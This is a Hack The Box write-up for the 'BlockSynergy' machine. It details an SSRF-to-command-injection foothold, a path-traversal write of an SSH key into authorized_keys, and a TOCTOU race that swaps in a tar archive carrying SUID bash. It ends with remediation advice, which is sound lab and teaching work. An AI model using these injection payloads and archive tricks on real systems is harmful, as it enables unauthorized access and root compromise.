# BlockSynergy HTB-Box Writeup
```text
BLOCKSYNERGY — DETAILED TECHNICAL WRITE-UP
=============================================

Platform: Hack The Box
Machine: BlockSynergy
Assessment Type: Authorized CTF / Lab
Initial Account: walter
Intermediate Account: hank
Final Target: root

SCOPE NOTE
----------
This document is a write-up of an authorized Hack The Box machine. Commands and
techniques are documented for the lab environment only.

This report is based on the terminal output, screenshots, commands, observations,
and attack-chain notes collected during the session. Where a mechanism was
inferred from observed behavior rather than directly readable source code, it is
described as an inference.

====================================================================
1. EXECUTIVE SUMMARY
====================================================================

BlockSynergy required chaining several weaknesses rather than relying on one
isolated exploit.

High-level attack chain:

    Web Application
        ->
    Blockchain / Smart Contract Functionality
        ->
    SSRF to Internal Admin Interface
        ->
    Command Injection
        ->
    Walter
        ->
    Internal Flask Development Application
        ->
    Debug Logging / Path Traversal
        ->
    SSH authorized_keys Write
        ->
    Hank
        ->
    Root Process / Service Enumeration
        ->
    Cron Backup Job
        ->
    Internal FTP Service
        ->
    Restore Workflow
        ->
    Writable Restore Workspace
        ->
    TOCTOU Race Condition
        ->
    Root-owned SUID Bash
        ->
    Root

The user-stage investigation took approximately 4 hours and the root-stage
investigation approximately another 6 hours.

====================================================================
2. WEB APPLICATION ENUMERATION
====================================================================

The main application was a custom Python blockchain service rather than a
traditional EVM node.

The dashboard exposed smart-contract operations such as:

    upload_contract
    contract_mint
    contract_burn
    contract_vote
    contract_claim

The dashboard was inspected with:

    sed -n '40,135p' templates/dashboard.html

The contract selector was enumerated with:

    curl -s http://127.0.0.1:5000/dashboard | grep -A5 -B5 'Contract #'

A contract selector entry was observed:

    <option value="0">Contract #0</option>

====================================================================
3. SMART-CONTRACT DEBUG FUNCTIONALITY
====================================================================

A contract was observed containing fields similar to:

    {
      "logic": {
        "claim": "allow"
      },
      "storage": {
        "balances": {},
        "total_supply": 0
      },
      "debug": "True",
      "__meta__": {
        "log_file": "test.log",
        "log_content": {
          "on_claim": "hello"
        }
      }
    }

The significant fields were:

    debug
    __meta__.log_file
    __meta__.log_content
    logic.claim

A test file was observed:

    cat /tmp/hank-write-test

Observed:

    [2026-08-30 02:09:06.995527] [on_claim] HANK_WRITE_TEST

Ownership was checked:

    ls -l /tmp/hank-write-test

Observed:

    -rw-r--r-- 1 hank hank 56 Aug 30 02:09 /tmp/hank-write-test

This demonstrated that the debug mechanism could write files with Hank's
privileges.

Security implication:

    attacker-controlled metadata
        +
    attacker-controlled log path
        +
    application-side file write
        =
    file-write primitive under application privileges

====================================================================
4. SSRF AND INTERNAL ADMIN ACCESS
====================================================================

The application exposed an internal administration interface.

The node-registration functionality accepted a URL using:

    0.0.0.0

A node could therefore be registered pointing toward the internal admin service:

    http://0.0.0.0:8080/admin

The internal request path used the node-management functionality:

    /admin/nodes/manage?action=ping_node&target=<URL_ENCODED_NODE>

Conceptually:

    External application
        ->
    attacker-controlled node URL
        ->
    server-side request
        ->
    internal admin service

This was an SSRF-style trust-boundary failure.

====================================================================
5. COMMAND INJECTION
====================================================================

A specially crafted node URL was used to investigate how the admin ping
function processed the target.

The relevant form was:

    http://x;id;a@0.0.0.0:8080/

The application URL validation treated 0.0.0.0 as a valid destination while the
backend processing exposed attacker-controlled content to a shell.

The resulting chain was:

    crafted URL
        ->
    URL validation bypass
        ->
    internal admin request
        ->
    shell command execution
        ->
    Walter

====================================================================
6. WALTER ENUMERATION
====================================================================

After obtaining Walter access, local enumeration focused on users, processes,
services and network listeners.

Useful commands included:

    id
    groups
    hostname
    pwd
    ls -la
    ss -lntp
    ps -ef

The important discovery was a Flask development application running as Hank.

Command:

    ps -u hank -f

Observed:

    hank 1474 1 0 Aug29 ? 00:00:06
    /opt/staging/smart_contracts/venv/bin/python3
    /opt/staging/smart_contracts/dev_app.py

The process command line was confirmed with:

    cat /proc/1474/cmdline | tr '\0' ' '; echo

Observed:

    /opt/staging/smart_contracts/venv/bin/python3
    /opt/staging/smart_contracts/dev_app.py

====================================================================
7. DISCOVERING devserver.service
====================================================================

The process was traced back to systemd:

    grep -RniE 'dev_app\.py|smart_contracts|1474' \
        /etc/systemd /etc/init.d /etc/supervisor* 2>/dev/null

Relevant service:

    /etc/systemd/system/devserver.service

Service contents:

    [Unit]
    Description=Development Server
    After=network.target

    [Service]
    User=hank
    WorkingDirectory=/opt/staging/smart_contracts
    ExecStart=/opt/staging/smart_contracts/venv/bin/python3 /opt/staging/smart_contracts/dev_app.py
    Restart=always

    [Install]
    WantedBy=multi-user.target

This confirmed that dev_app.py was executed as Hank.

====================================================================
8. WALTER -> HANK
====================================================================

Hank was enumerated:

    id hank

Observed:

    uid=1001(hank) gid=1003(hank)
    groups=1003(hank),1001(developers)

Account entry:

    getent passwd hank

Observed:

    hank:x:1001:1003::/home/hank:/bin/bash

SSH was available on port 22:

    ss -lntp | grep ':22'

The smart-contract debug file-write primitive was then used to target Hank's
SSH authorized_keys.

The relevant contract metadata concept was:

    {
      "logic": {"claim": "allow"},
      "debug": "True",
      "hooks": {"on_claim": "log"},
      "__meta__": {
        "log_file": "../../../../home/hank/.ssh/authorized_keys",
        "log_content": {
          "on_claim": "\n<SSH_PUBLIC_KEY>"
        }
      }
    }

The important weakness was path traversal in:

    __meta__.log_file

The intended destination was:

    /home/hank/.ssh/authorized_keys

An initial SSH attempt failed:

    ssh -i /tmp/hank_key \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        hank@127.0.0.1

Result:

    Permission denied (publickey,password).

This was a useful troubleshooting point: generating a key does not establish
access unless the public key is actually written to the correct authorized_keys
file.

After correcting the injection stage, Hank access was obtained.

====================================================================
9. HANK PRIVILEGE-ESCALATION ENUMERATION
====================================================================

Hank's identity:

    id

Observed:

    uid=1001(hank) gid=1003(hank)
    groups=1003(hank),1001(developers)

Groups:

    groups

Observed:

    hank developers

Sudo testing did not produce access:

    sudo ...

Observed:

    sudo: 3 incorrect password attempts

The investigation therefore shifted to:

    systemd
    cron
    root processes
    writable directories
    local services
    automated backup/restore behavior

====================================================================
10. ROOT RESTORE DAEMON
====================================================================

Systemd enumeration:

    systemctl list-units --type=service --all |
        grep -Ei 'smart|contract|staging|block'

A high-value service was discovered:

    restore.service

Configuration:

    systemctl cat restore.service

Observed:

    [Unit]
    Description=Restore Daemon
    After=network.target

    [Service]
    User=root
    WorkingDirectory=/
    ExecStart=/bin/bash /opt/backup/restore_daemon.sh
    Restart=always

    [Install]
    WantedBy=multi-user.target

Status:

    systemctl status restore.service --no-pager

Observed:

    restore.service - Restore Daemon
    Active: active (running)

    Main PID: 1477

    root 1477 1 /bin/bash /opt/backup/restore_daemon.sh

This established a root execution boundary:

    restore.service
        ->
    /opt/backup/restore_daemon.sh
        ->
    root

====================================================================
11. WHY restore_daemon.sh WAS NOT READABLE
====================================================================

Direct access failed:

    cat /opt/backup/restore_daemon.sh

Result:

    Permission denied

Path permissions:

    namei -l /opt/backup/restore_daemon.sh

Relevant output:

    drwxr-xr-x root root /
    drwxr-xr-x root root opt
    drwxrwx--- root sysadmins backup
                             restore_daemon.sh - Permission denied

The sysadmins group:

    getent group sysadmins

Observed:

    sysadmins:x:1002:mike

Mike:

    id mike

Observed:

    uid=1002(mike) gid=1004(mike)
    groups=1004(mike),1002(sysadmins)

Hank was not a member of sysadmins.

Important lesson:

    A privileged script does not have to be readable to investigate the
    privileged process that executes it.

The service definition, process tree, child processes, filesystem activity and
network activity were sufficient to reconstruct the workflow.

====================================================================
12. CRON BACKUP JOB
====================================================================

The system-wide crontab was examined:

    cat /etc/crontab

Important entry:

    */5 * * * *    root /opt/backup/backup.sh

Therefore:

    every 5 minutes
        ->
    root
        ->
    /opt/backup/backup.sh

====================================================================
13. PSPY ALTERNATIVE
====================================================================

pspy was not available as a command.

Instead, standard Linux process monitoring was used.

Example:

    while true; do
        date
        ps -eo user,pid,ppid,etime,cmd |
            grep -E 'backup|restore' |
            grep -v grep
        sleep 1
    done

A faster monitor was also used:

    while true; do
        ps -eo user,pid,ppid,cmd 2>/dev/null |
            grep -E 'backup\.sh|curl.*15432|ftp' |
            grep -v grep
        sleep 0.1
    done

This eventually revealed:

    root 481359 481357 /bin/sh -c /opt/backup/backup.sh
    root 481363 481359 /bin/bash /opt/backup/backup.sh

Most importantly:

    root 481583 481363 /usr/bin/curl -T /tmp/_opt_blocksynergy.tar.gz \
    ftp://ftpuser:<FTP_PASSWORD>@127.0.0.1:15432/upload/_opt_blocksynergy.tar.gz

This exposed the internal FTP credentials and backup destination.

====================================================================
14. INTERNAL FTP SERVICE
====================================================================

Port 15432 was not permanently visible.

During the backup cycle, the root process exposed:

    127.0.0.1:15432

The FTP service was identified as:

    vsFTPd 3.0.5

Connection:

    curl -v \
    'ftp://ftpuser:<FTP_PASSWORD>@127.0.0.1:15432/upload/'

Observed:

    220 (vsFTPd 3.0.5)
    331 Please specify the password.
    230 Login successful.

The upload directory contained:

    _opt_blocksynergy.tar.gz
    _opt_staging.tar.gz

Observed approximate sizes:

    _opt_blocksynergy.tar.gz    11 MB
    _opt_staging.tar.gz         221 MB

Important lesson:

    A service that is only available during an automated job can be missed by
    ordinary static port scanning.

Process monitoring revealed the service's operational context.

====================================================================
15. BACKUP ARCHIVE ANALYSIS
====================================================================

The BlockSynergy archive was downloaded for offline analysis.

Listing:

    tar -tzf /tmp/blocksynergy.tar.gz | head -50

Observed structure:

    opt/blocksynergy/
    opt/blocksynergy/venv/
    opt/blocksynergy/venv/bin/
    opt/blocksynergy/venv/lib/

Interesting-file search:

    tar -tzf /tmp/blocksynergy.tar.gz |
        grep -Ei 'backup|restore|config|secret|password|key|ssh'

Results primarily included Python package files such as:

    flask/config.py
    pip configuration modules
    ecdsa key/SSH modules

No direct restore script was revealed through this archive search.

This demonstrated the importance of analyzing archive contents without assuming
the first archive contains the privilege-escalation component.

====================================================================
16. RESTORE WORK DIRECTORY
====================================================================

The restore directory:

    ls -ld /var/restore_work

Observed:

    drwxrwxr-x 2 root developers ...

Hank belongs to:

    developers

Initial listing:

    ls -lah /var/restore_work/

Observed only:

    .
    ..

The directory permissions were nevertheless significant because the developers
group had write access.

====================================================================
17. RESTORE TRIGGER
====================================================================

The restore workflow was associated with:

    /opt/blocksynergy/restore

The trigger was tested:

    touch /opt/blocksynergy/restore

Checking immediately afterwards sometimes returned:

    ls: cannot access '/opt/blocksynergy/restore':
    No such file or directory

Rather than assuming the trigger was broken, the process behavior was monitored.

The disappearance was consistent with the daemon consuming the trigger quickly.

====================================================================
18. SHORT-LIVED ARCHIVE DETECTION
====================================================================

A simple one-second polling loop did not reliably see the archive.

Example:

    while true; do
        date
        ls -lah /var/restore_work/
        sleep 1
    done

The directory appeared empty.

Filesystem-event monitoring was therefore used.

The watcher monitored:

    /var/restore_work

for events such as:

    CREATE
    CLOSE_WRITE
    CLOSE_NOWRITE
    MOVED_TO
    MOVED_FROM
    DELETE

Observed:

    [*] Watching /var/restore_work

    [+] CREATED: _opt_blocksynergy.tar.gz
        size=11378956
        uid=0
        gid=0

    [-] REMOVED: _opt_blocksynergy.tar.gz

This confirmed that the root restore workflow was downloading an archive and
removing/consuming it rapidly.

Key lesson:

    For very short-lived artifacts:

        filesystem events > slow polling

====================================================================
19. TOCTOU ANALYSIS
====================================================================

The observed behavior supported a check-then-use pattern.

Conceptually:

    Root downloads trusted archive
            |
            v
    /var/restore_work/archive.tar.gz
            |
            v
    SHA256 verification
            |
            v
    checksum reader closes
            |
            v
          RACE
            |
            v
    privileged extraction
            |
            v
    tar ... -C /

The vulnerability class is:

    TOCTOU
    Time Of Check To Time Of Use

The security issue occurs when a privileged process verifies one filesystem
object and later reopens the same mutable pathname.

If the pathname can be replaced between verification and extraction, the
integrity check can apply to one object while the privileged operation consumes
another.

====================================================================
20. MALICIOUS ARCHIVE CONSTRUCTION
====================================================================

A malicious archive containing Bash with SUID permissions was constructed:

    tar --owner=0 --group=0 --mode=4755 \
        --transform='s|^bash$|opt/blocksynergy/.diag|' \
        -czf /tmp/restore_suid.tar.gz \
        -C /bin bash

The archive was inspected:

    tar -tvzf /tmp/restore_suid.tar.gz

Observed:

    -rwsr-xr-x root/root 1446024 ...
    opt/blocksynergy/.diag

Important properties:

    owner = root
    group = root
    mode  = 4755

Intended extracted path:

    /opt/blocksynergy/.diag

The objective was for privileged archive extraction to create a root-owned SUID
Bash executable at that path.

====================================================================
21. RACE-CONDITION SEQUENCE
====================================================================

The intended race sequence was:

    1. Trigger restoration.

    2. Root downloads the trusted archive.

    3. The archive appears in /var/restore_work.

    4. Root calculates its SHA256.

    5. The checksum reader closes the file.

    6. The archive pathname is replaced.

    7. Root reopens the pathname for extraction.

    8. The malicious archive is extracted with root privileges.

The important timing window is:

    SHA256 close
        |
        v
    pathname replacement
        |
        v
    tar opens pathname

The replacement primitive used by the automation was:

    os.replace(source, destination)

The use of an atomic rename/replacement operation is important because it changes
the directory entry without requiring the target file to be edited in place.

====================================================================
22. AUTOMATION DESIGN
====================================================================

The automation was designed around filesystem events.

Important paths:

    WATCH_DIR = "/var/restore_work"
    TARGET_NAME = "_opt_blocksynergy.tar.gz"
    TARGET = "/var/restore_work/_opt_blocksynergy.tar.gz"
    MALICIOUS = "/tmp/restore_suid.tar.gz"
    TRIGGER = "/opt/blocksynergy/restore"
    DIAG = "/opt/blocksynergy/.diag"

Conceptual workflow:

    create malicious archive
            |
            v
    monitor restore directory
            |
            v
    detect trusted archive
            |
            v
    detect checksum/read close
            |
            v
    atomically replace pathname
            |
            v
    wait for extraction
            |
            v
    check for .diag

====================================================================
23. ROOT VERIFICATION
====================================================================

After the race, the intended checks are:

    ls -l /opt/blocksynergy/.diag

Expected:

    -rwsr-xr-x 1 root root ... /opt/blocksynergy/.diag

The SUID Bash is intended to be launched with:

    /opt/blocksynergy/.diag -p

Then:

    id

Expected privilege indicator:

    euid=0(root)

Finally, in the authorized HTB environment:

    cat /root/root.txt

NOTE:
-----
The supplied session evidence showed the malicious archive was successfully
constructed and the restore workflow was being monitored. The .diag existence
check shown during the session still reported:

    [-] .diag does not exist yet.
    [*] The restore/SUID stage has not completed.

Therefore this report distinguishes the observed preparation/analysis from the
intended final verification stage rather than inventing a flag value.

====================================================================
24. COMPLETE ATTACK CHAIN
====================================================================

PHASE 1 — WEB -> WALTER

    Custom blockchain application
        ->
    Smart-contract/dashboard enumeration
        ->
    Internal admin endpoint
        ->
    SSRF using 0.0.0.0
        ->
    Crafted node URL
        ->
    Command injection
        ->
    Walter shell


PHASE 2 — WALTER -> HANK

    Walter
        ->
    Internal Flask application
        ->
    Debug contract functionality
        ->
    Attacker-controlled log_file
        ->
    Path traversal
        ->
    /home/hank/.ssh/authorized_keys
        ->
    SSH public-key injection
        ->
    Hank shell


PHASE 3 — HANK -> ROOT

    Hank
        ->
    developers group
        ->
    /opt/blocksynergy/restore
        ->
    Root restore daemon
        ->
    Five-minute root cron backup
        ->
    Internal FTP :15432
        ->
    Trusted archive
        ->
    /var/restore_work
        ->
    SHA256 verification
        ->
    TOCTOU race
        ->
    Malicious TAR
        ->
    Root-owned SUID Bash
        ->
    Root


====================================================================
25. KEY COMMAND REFERENCE
====================================================================

ACCOUNT ENUMERATION
-------------------

    id
    groups
    hostname
    getent passwd hank
    getent passwd mike
    getent group sysadmins


PROCESS ENUMERATION
-------------------

    ps -ef
    ps -u hank -f
    ps -eo user,pid,ppid,etime,cmd
    ps -eo user,pid,ppid,cmd


SYSTEMD ENUMERATION
-------------------

    systemctl list-units --type=service --all
    systemctl cat devserver.service
    systemctl cat restore.service
    systemctl status restore.service --no-pager
    systemctl show restore.service \
        -p ExecStart \
        -p WorkingDirectory \
        -p User \
        -p Group


FILESYSTEM PERMISSIONS
----------------------

    ls -la
    ls -ld /opt/backup
    namei -l /opt/backup/restore_daemon.sh
    ls -ld /var/restore_work
    find /var/restore_work -maxdepth 2 -ls


CRON
----

    cat /etc/crontab

    grep -RniE 'backup|restore' \
        /etc/cron* /etc/systemd/system 2>/dev/null


NETWORK
-------

    ss -lntp
    ss -tulnp
    ss -lntp | grep ':22'


LOCAL HTTP
----------

    curl -i http://127.0.0.1:5000/dashboard

    curl -s http://127.0.0.1:5000/dashboard |
        grep -A5 -B5 'Contract #'


FTP
---

    curl -v \
    'ftp://ftpuser:<FTP_PASSWORD>@127.0.0.1:15432/upload/'


ARCHIVE ANALYSIS
----------------

    tar -tzf /tmp/blocksynergy.tar.gz | head -50

    tar -tzf /tmp/blocksynergy.tar.gz |
        grep -Ei 'backup|restore|config|secret|password|key|ssh'

    tar -tvzf /tmp/restore_suid.tar.gz


RESTORE TRIGGER
---------------

    touch /opt/blocksynergy/restore


MALICIOUS ARCHIVE
-----------------

    tar --owner=0 --group=0 --mode=4755 \
        --transform='s|^bash$|opt/blocksynergy/.diag|' \
        -czf /tmp/restore_suid.tar.gz \
        -C /bin bash


FINAL CHECKS
------------

    ls -l /opt/blocksynergy/.diag
    /opt/blocksynergy/.diag -p
    id
    cat /root/root.txt


====================================================================
26. TROUBLESHOOTING / CHALLENGES
====================================================================

CHALLENGE 1 — xterm-kitty

Error:

    Error opening terminal: xterm-kitty.

Impact:

    nano could not start in the remote shell.

Lesson:

    Terminal compatibility is separate from the target vulnerability. Use a
    supported terminal type or another file-creation method.


CHALLENGE 2 — getfacl restrictions

Command:

    getfacl -p /opt/backup

Result:

    Please ask your administrator.

Lesson:

    One unavailable enumeration utility should not stop the investigation.
    namei, ls, systemctl, ps and runtime behavior were enough to continue.


CHALLENGE 3 — restore_daemon.sh unreadable

Command:

    cat /opt/backup/restore_daemon.sh

Result:

    Permission denied

Lesson:

    Investigate the service indirectly through systemd, /proc, process trees,
    cron and filesystem/network behavior.


CHALLENGE 4 — pspy unavailable

Solution:

    ps -eo user,pid,ppid,etime,cmd

with continuous polling.

Lesson:

    pspy is useful but not mandatory. Standard Linux tools can expose transient
    privileged processes.


CHALLENGE 5 — FTP port 15432 appeared unavailable

Initial static checks did not consistently show the port.

Later:

    curl -T ... ftp://ftpuser:<PASSWORD>@127.0.0.1:15432/...

appeared in the root backup process.

Lesson:

    Time-dependent services must be observed while their parent automation runs.


CHALLENGE 6 — restore directory appeared empty

Repeated:

    ls -lah /var/restore_work/

showed no archive.

Filesystem event monitoring revealed:

    CREATED: _opt_blocksynergy.tar.gz
    REMOVED: _opt_blocksynergy.tar.gz

Lesson:

    Short-lived files can easily disappear between polling intervals.


CHALLENGE 7 — restore trigger disappeared

After:

    touch /opt/blocksynergy/restore

the file could no longer be seen immediately.

Interpretation:

    The daemon was likely reacting to and consuming the trigger quickly.

Lesson:

    A trigger that disappears immediately may indicate that the watcher is
    working rather than failing.


CHALLENGE 8 — SSH key authentication failed

Initial:

    ssh -i /tmp/hank_key ... hank@127.0.0.1

Result:

    Permission denied (publickey,password).

Lesson:

    Verify the complete chain:

        private key
        public key
        destination path
        authorized_keys contents
        file permissions
        target account
        SSH configuration


====================================================================
27. KEY TECHNICAL LESSONS
====================================================================

1. ENUMERATION IS ITERATIVE

The final attack path did not appear in the first enumeration pass.

Repeated investigation of:

    processes
    services
    cron
    network activity
    permissions
    application behavior

revealed progressively more information.


2. PROCESS COMMAND LINES CAN LEAK CREDENTIALS

The root curl command exposed the internal FTP username and password.

Credentials should never be placed directly in command-line arguments because
they can become visible through process enumeration.


3. TRANSIENT SERVICES MATTER

Port 15432 was operational during the backup workflow even though it was not
consistently visible through static checks.


4. WRITE ACCESS CAN BE MORE IMPORTANT THAN READ ACCESS

Hank could not read:

    /opt/backup/restore_daemon.sh

but could interact with resources involved in the restore workflow.

The restore workspace permissions were therefore more important than direct
script readability.


5. DIRECTORY OWNERSHIP AND GROUP MEMBERSHIP MATTER

The directory:

    /var/restore_work

was:

    root:developers
    0775

Hank belonged to developers.

This created a significant filesystem trust boundary.


6. FILESYSTEM EVENTS ARE VALUABLE

The archive was short-lived enough that normal ls polling missed it.

Filesystem events exposed the actual lifecycle.


7. TOCTOU BUGS ARE ABOUT OBJECT IDENTITY

The fundamental problem is not simply:

    "the file is writable"

It is:

    "the security check applies to an object, but the privileged use may later
     operate on a different object referenced by the same pathname."


8. PRIVILEGE ESCALATION IS OFTEN AN ATTACK GRAPH

The final root path depended on multiple individually understandable weaknesses:

    SSRF
    command injection
    arbitrary file write
    path traversal
    SSH trust
    group permissions
    cron
    FTP
    restore automation
    TOCTOU
    SUID


====================================================================
28. DEFENSIVE REMEDIATION
====================================================================

A. SSRF

Use strict destination allowlists and block access to loopback/private
addresses and rebinding tricks.

B. COMMAND INJECTION

Never concatenate user-controlled URL components into shell commands.

Prefer argument arrays and:

    shell=False

C. DEBUG LOGGING

Do not allow contract metadata to choose arbitrary filesystem paths.

Use a fixed log directory and canonical-path validation.

D. SSH AUTHORIZED_KEYS

Application components should never be able to write authentication files.

E. CREDENTIAL HANDLING

Do not expose FTP credentials through command-line arguments.

Use protected configuration or a credential-management mechanism.

F. RESTORE WORKSPACE

The unprivileged application user should not be able to create, remove or
replace files in a directory consumed by a root process.

G. TOCTOU PREVENTION

Do not:

    verify(path)
    reopen(path)
    use(path)

against a mutable pathname.

Instead, securely open the object, verify the exact object and consume that
same object, or move it into a directory inaccessible to unprivileged users.

H. ARCHIVE EXTRACTION

Privileged extraction must validate:

    path traversal
    absolute paths
    symlinks
    hardlinks
    ownership
    permissions
    archive contents

Do not blindly extract attacker-controlled archives as root.

I. SUID

Restore operations should not allow arbitrary SUID executables to be created.


====================================================================
29. WRITE-UP TAKEAWAYS
====================================================================

The most valuable lesson from BlockSynergy was learning to follow trust
boundaries.

At each stage the important question was:

    "What does this privileged component trust that I can influence?"

Examples:

    Web application
        -> trusted a node URL

    Admin ping functionality
        -> processed URL-derived command data

    Smart-contract debug engine
        -> trusted a log path

    SSH
        -> trusted authorized_keys

    Restore daemon
        -> trusted a trigger

    Backup system
        -> used an internal FTP service

    Restore workflow
        -> trusted a pathname after verification

Once these relationships were mapped, the machine stopped looking like unrelated
services and became a connected attack graph.

====================================================================
30. CONCLUSION
====================================================================

BlockSynergy was a difficult multi-stage machine because the final escalation
depended on understanding the interaction between application behavior, Linux
permissions, scheduled jobs, internal services and filesystem timing.

The progression was:

    WEB
      ->
    SSRF
      ->
    COMMAND INJECTION
      ->
    WALTER
      ->
    SMART-CONTRACT DEBUG FILE WRITE
      ->
    PATH TRAVERSAL
      ->
    HANK AUTHORIZED_KEYS
      ->
    HANK
      ->
    ROOT RESTORE DAEMON
      ->
    CRON BACKUP
      ->
    INTERNAL FTP
      ->
    WRITABLE RESTORE WORKSPACE
      ->
    TOCTOU
      ->
    MALICIOUS ARCHIVE
      ->
    SUID BASH
      ->
    ROOT

The most important practical lesson was that privilege escalation is often about
understanding how trusted automation interacts with attacker-controlled state.

The machine also reinforced an important methodology:

    enumerate
        ->
    observe
        ->
    form a hypothesis
        ->
    test it
        ->
    monitor runtime behavior
        ->
    refine the attack path
        ->
    exploit only after understanding the trust boundary

END OF TECHNICAL WRITE-UP
```
